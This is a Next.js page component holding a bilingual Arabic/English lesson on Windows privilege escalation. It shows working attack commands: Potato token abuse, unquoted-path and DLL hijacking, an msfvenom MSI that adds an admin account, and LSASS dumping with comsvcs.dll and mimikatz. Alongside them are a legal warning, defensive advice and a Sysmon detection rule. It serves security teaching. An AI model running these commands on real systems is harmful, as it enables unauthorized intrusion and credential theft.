"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="windows-privesc">
      <L
        ar={<>
          <Section title="من low-priv user إلى NT AUTHORITY\\SYSTEM">
            <Analogy>
              يعني إيه إنت user عادي على Windows؟
              يعني إنت بتتفرّج على شاشة بنسبة 10٪ من الجهاز.
              ليه نقعد كده؟
              <br/><br/>
              - طب أنا user عادي، ايه اللي أنا أقدر أعمله أصلاً يا حضرتك؟؟
              <br/><br/>
              يا مستجد، الـ user العادي عنده صلاحية كتابة في أماكن أكتر مما تتخيل. وفيه service نسي الـ admin يقفلها صح. وفيه scheduled task شغّال SYSTEM وبيشغّل سكربت من فولدر إنت كاتب فيه. اللعبة مش "ايه اللي عندي"، اللعبة "ايه اللي مغلطه".
              <br/><br/>
              Windows زي قلعة فيها مئات الأبواب الصغيرة. المفروض كلها متقفلة، بس دايماً فيه باب حد نسيه مفتوح. تصعيد الصلاحيات في Windows = إنك تلاقي الأبواب دي: خدمة بـ path ضعيف، DLL برنامج بيدوّر عليه في مكان إنت تقدر تكتب فيه، token عملية تانية إنت تقدر تسرقه.
              <br/><br/>
              SYSTEM في Windows أعلى من Administrator في حالات معينة (الوصول للذاكرة، LSASS، tokens). معظم تصعيد الصلاحيات على Windows هدفه يطلع SYSTEM لأنه ده الباب اللي بيفتحلك credential dumping و persistence حقيقي. أقل من كده شغل ناقص.
              <br/><br/>
              في 2022، PrintNightmare (CVE-2021-34527) ضرب كل سيرفر Windows على وجه الأرض. أي domain user يقدر يبقى SYSTEM على أي host شغّال Print Spooler. مايكروسوفت أصدرت 4 patches قبل ما يقفلوها صح. شركات لسة شغّالة بـ Print Spooler مفعّل في 2026.
            </Analogy>
            <Callout kind="warn" title="غلطات الـ junior على Windows">
              <ul>
                <li>يلاقي SeImpersonate ويولّع GodPotato من غير ما يفحص الـ Defender. الـ binary معروف من اسمه.</li>
                <li>يجرّب JuicyPotato على Server 2019+. ما بيشتغلش. اعمل بحث الأول قبل ما تجرب.</li>
                <li>ينسى يفحص الـ Unquoted Service Paths. كنز قديم لسة موجود في 2026.</li>
                <li>يعمل mimikatz من غير ما يحقن في عملية موثوقة. الـ EDR بيشوفه قبل ما يكمّل اسم الـ binary.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="الاستطلاع الأولي">
            <Code lang="powershell">{`# هوية وامتيازات
whoami /all
whoami /priv      # الامتيازات الحالية — أهم سؤال

# معلومات النظام
systeminfo
$PSVersionTable

# الخدمات
Get-Service | Where-Object Status -eq 'Running'
Get-WmiObject Win32_Service | Select Name, PathName, StartName

# المهام المجدولة
Get-ScheduledTask | Where-Object State -eq 'Ready'

# Patches المثبّتة (لمقارنتها بـ Windows-Exploit-Suggester)
Get-HotFix | Sort InstalledOn -Descending | Select -First 20`}</Code>
          </Section>

          <Section title="أهم خمس قنوات تصعيد">
            <Step n={1} title="Privilege abuse — SeImpersonate / SeAssignPrimaryToken">
              لو <span className="eng">whoami /priv</span> ورّاك <span className="eng">SeImpersonatePrivilege</span> يبقى إنت قريب جداً من SYSTEM. ده اللي اسمه Potato attacks (RoguePotato, JuicyPotato, GodPotato, SigmaPotato). من هنا للسما.
              <Code lang="powershell">{`# على Windows Server 2019+:
.\\GodPotato.exe -cmd "cmd /c whoami"
# => nt authority\\system`}</Code>
            </Step>
            <Step n={2} title="Unquoted Service Path">
              خدمة عندها path زي <span className="eng">C:\\Program Files\\My App\\service.exe</span> من غير quotes، وعندك صلاحية كتابة على <span className="eng">C:\\Program Files\\My.exe</span>؟ Windows هيحاول يشغّله. خرم كلاسيكي.
              <Code lang="powershell">{`# ابحث عنها:
wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows" | findstr /i /v """
# لو وجدت، استبدل My.exe بـ payload و أعد تشغيل الخدمة`}</Code>
            </Step>
            <Step n={3} title="Service Binary / DLL Hijacking">
              لو الخدمة شغالة كـ SYSTEM وملفها قابل للكتابة منك، استبدله ببساطة. أو لو بتستدعي DLL مش موجود في ترتيب البحث، حط DLL خبيث في طريقها.
              <Code lang="powershell">{`# تحقق من ACL:
icacls "C:\\Path\\To\\service.exe"
# ابحث عن BUILTIN\\Users:F أو NT AUTHORITY\\Authenticated Users:F`}</Code>
            </Step>
            <Step n={4} title="Always Install Elevated">
              مفتاح registry يفرض تشغيل MSI installers بصلاحيات SYSTEM، حتى لو شغّلهم مستخدم عادي.
              <Code lang="powershell">{`reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# لو الاثنين = 1:
msfvenom -p windows/x64/exec CMD='cmd /c net user pwn P@ssw0rd /add && net localgroup administrators pwn /add' -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi`}</Code>
            </Step>
            <Step n={5} title="UAC Bypass">
              ليست تصعيداً تقنياً (admin → admin)، لكنها مفيدة لـ Medium Integrity → High. Examples:
              <span className="eng"> fodhelper.exe</span>، <span className="eng">eventvwr.exe</span>، <span className="eng">computerdefaults.exe</span>.
            </Step>
          </Section>

          <Section title="WinPEAS — الأتمتة">
            <Terminal lines={[
              { p: "iwr -Uri https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O C:\\temp\\wp.exe" },
              { p: "C:\\temp\\wp.exe -applicationsinfo -systeminfo -windowscreds" },
              { o: "[+] SeImpersonatePrivilege — Enabled (Potato!)\n[!] Unquoted service: VulnSvc -> C:\\Program Files\\My App\\service.exe\n[!] AlwaysInstallElevated = 1 (HKCU+HKLM)" },
            ]} />
          </Section>

          <Section title="Credential Dumping بعد SYSTEM">
            <p>
              بمجرد الوصول إلى SYSTEM، LSASS يصبح الهدف. هذا يعطيك hashes و TGT و tokens لتحريك جانبي.
            </p>
            <Code lang="powershell">{`# تفريغ LSASS بدون أداة معروفة
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\temp\\lsass.dmp full

# تحليل لاحق على آلتك
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"`}</Code>
          </Section>

          <Callout kind="danger" title="تحذير قانوني">
            سرقة tokens و LSASS من نظام لا تملكه = تجاوز <span className="eng">18 U.S.C. § 1030</span>. كل ما هنا
            للمختبرات المعزولة أو engagements مع authorization مكتوب.
          </Callout>

          <Callout kind="good" title="اللي بيشتغل فعلاً للـ Blue Team">
            <ul>
              <li>راقب <span className="eng">SeImpersonatePrivilege</span> abuse: child process من IIS / SQL Server بصلاحية SYSTEM = مشبوه</li>
              <li>Credential Guard لحماية LSASS (Windows 10+ Enterprise)</li>
              <li>Disable <span className="eng">AlwaysInstallElevated</span> في كل GPO</li>
              <li>راجع service paths شهرياً — لا unquoted</li>
              <li>EDR تحدد signatures لأدوات Potato عائلة</li>
              <li>راقب <span className="eng">comsvcs.dll!MiniDump</span> calls (Sysmon Event 10 على lsass)</li>
            </ul>
          </Callout>

          <Section title="Sysmon detection rules">
            <Code lang="xml">{`<Sysmon schemaversion="4.82">
  <EventFiltering>
    <RuleGroup name="LSASS Access" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="end with">lsass.exe</TargetImage>
        <GrantedAccess condition="is">0x1010</GrantedAccess>
      </ProcessAccess>
    </RuleGroup>
  </EventFiltering>
</Sysmon>`}</Code>
          </Section>

          <Section title="الخلاصة الناشفة">
            <p>
              Windows privesc عبارة عن 3 أسئلة تسألهم لنفسك:
              <br/>
              1. <code>whoami /priv</code> ورّاك إيه؟ SeImpersonate موجود؟ خلاص، GodPotato.
              <br/>
              2. فيه service بـ unquoted path وإنت تقدر تكتب في الـ folder؟ خلاص، DLL hijack.
              <br/>
              3. فيه scheduled task شغّال SYSTEM وبيشغّل سكربت إنت تقدر تعدّله؟ خلاص.
              <br/><br/>
              الـ junior بيشغّل WinPEAS ويتفرّج على الـ output 5 دقايق ويقول "مفيش حاجة".
              <br/>
              الـ pro بيقرا كل سطر، ويفهم ليه الأداة لوّنته أحمر.
              <br/><br/>
              السكة من low-priv لـ SYSTEM متفتحة في 80٪ من السيرفرات اللي شفتها. مش علشان Windows ضعيف — علشان admins بيركّبوا وينسوا.
              <br/><br/>
              اوعى تفتح WinPEAS وتقفل في دقيقتين. اقعد على الـ output لحد ما تفهم كل سطر أحمر بيحصل ليه.
            </p>
          </Section>
          <Section title="مصادر">
            <ul>
              <li>HackTricks — Windows Local Privilege Escalation</li>
              <li>SpecterOps — Atomic Red Team T1134</li>
              <li>MITRE ATT&CK — TA0004 Privilege Escalation</li>
              <li>Microsoft Security Compliance Toolkit</li>
            </ul>
          </Section>
        </>}

        en={<>
          <Section title="From low-priv user to NT AUTHORITY\\SYSTEM">
            <Analogy>
              Windows is a fortress with hundreds of small doors. Each is supposed to be locked, but someone forgot.
              Privilege escalation is finding those doors: a service with a weak path, a DLL search a program does in
              a folder you can write to, a token from another process you can steal.
            </Analogy>
            <p>
              SYSTEM is higher than Administrator in some respects (memory access, LSASS, tokens). Most Windows
              privesc targets SYSTEM because it unlocks credential dumping and real persistence.
            </p>
          </Section>

          <Section title="Initial recon">
            <Code lang="powershell">{`# Identity and privileges
whoami /all
whoami /priv      # current privileges — most important question

# System info
systeminfo
$PSVersionTable

# Services
Get-Service | Where-Object Status -eq 'Running'
Get-WmiObject Win32_Service | Select Name, PathName, StartName

# Scheduled tasks
Get-ScheduledTask | Where-Object State -eq 'Ready'

# Installed patches
Get-HotFix | Sort InstalledOn -Descending | Select -First 20`}</Code>
          </Section>

          <Section title="Top five escalation paths">
            <Step n={1} title="Privilege abuse — SeImpersonate / SeAssignPrimaryToken">
              If <span className="eng">whoami /priv</span> shows <span className="eng">SeImpersonatePrivilege</span> you're
              one short hop from SYSTEM. Family known as Potato attacks (RoguePotato, JuicyPotato, GodPotato,
              SigmaPotato).
              <Code lang="powershell">{`# Windows Server 2019+
.\\GodPotato.exe -cmd "cmd /c whoami"
# => nt authority\\system`}</Code>
            </Step>
            <Step n={2} title="Unquoted Service Path">
              A service with path like <span className="eng">C:\\Program Files\\My App\\service.exe</span> with no quotes,
              and you can write to <span className="eng">C:\\Program Files\\My.exe</span>? Windows will try to run it.
              <Code lang="powershell">{`wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows" | findstr /i /v """
# if found, drop My.exe payload and restart the service`}</Code>
            </Step>
            <Step n={3} title="Service Binary / DLL Hijacking">
              If a SYSTEM service's binary is writable by you, replace it. Or if it loads a DLL from a search path you
              can poison, drop a malicious DLL.
              <Code lang="powershell">{`# Check ACLs:
icacls "C:\\Path\\To\\service.exe"
# Look for BUILTIN\\Users:F or NT AUTHORITY\\Authenticated Users:F`}</Code>
            </Step>
            <Step n={4} title="AlwaysInstallElevated">
              A registry policy that runs MSI installers as SYSTEM, even when launched by a normal user.
              <Code lang="powershell">{`reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# both = 1:
msfvenom -p windows/x64/exec CMD='cmd /c net user pwn P@ssw0rd /add && net localgroup administrators pwn /add' -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi`}</Code>
            </Step>
            <Step n={5} title="UAC Bypass">
              Not a true privesc (admin → admin), but useful for Medium → High Integrity. Classic auto-elevated
              targets: <span className="eng">fodhelper.exe</span>, <span className="eng">eventvwr.exe</span>,
              <span className="eng"> computerdefaults.exe</span>.
            </Step>
          </Section>

          <Section title="WinPEAS — automation">
            <Terminal lines={[
              { p: "iwr -Uri https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O C:\\temp\\wp.exe" },
              { p: "C:\\temp\\wp.exe -applicationsinfo -systeminfo -windowscreds" },
              { o: "[+] SeImpersonatePrivilege — Enabled (Potato!)\n[!] Unquoted service: VulnSvc -> C:\\Program Files\\My App\\service.exe\n[!] AlwaysInstallElevated = 1 (HKCU+HKLM)" },
            ]} />
          </Section>

          <Section title="Credential dumping after SYSTEM">
            <p>
              Once you're SYSTEM, LSASS is the prize. It hands you hashes, TGTs, and tokens for lateral movement.
            </p>
            <Code lang="powershell">{`# Dump LSASS without a known tool
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\temp\\lsass.dmp full

# Offline analysis
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"`}</Code>
          </Section>

          <Callout kind="danger" titleEn="Legal warning">
            Stealing tokens or LSASS from a system you don't own = <span className="eng">18 U.S.C. § 1030</span> violation.
            Everything here belongs in isolated labs or engagements with written authorization.
          </Callout>

          <Callout kind="good" titleEn="Defense — what blue teams should do">
            <ul>
              <li>Watch <span className="eng">SeImpersonatePrivilege</span> abuse: child SYSTEM process from IIS / SQL Server is suspicious</li>
              <li>Enable Credential Guard to protect LSASS (Windows 10+ Enterprise)</li>
              <li>Disable <span className="eng">AlwaysInstallElevated</span> in every GPO</li>
              <li>Audit service paths monthly — no unquoted</li>
              <li>EDR should ship Potato-family signatures</li>
              <li>Watch for <span className="eng">comsvcs.dll!MiniDump</span> calls (Sysmon Event 10 on lsass)</li>
            </ul>
          </Callout>

          <Section title="Sysmon detection rules">
            <Code lang="xml">{`<Sysmon schemaversion="4.82">
  <EventFiltering>
    <RuleGroup name="LSASS Access" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="end with">lsass.exe</TargetImage>
        <GrantedAccess condition="is">0x1010</GrantedAccess>
      </ProcessAccess>
    </RuleGroup>
  </EventFiltering>
</Sysmon>`}</Code>
          </Section>

          <Section title="References">
            <ul>
              <li>HackTricks — Windows Local Privilege Escalation</li>
              <li>SpecterOps — Atomic Red Team T1134</li>
              <li>MITRE ATT&CK — TA0004 Privilege Escalation</li>
              <li>Microsoft Security Compliance Toolkit</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
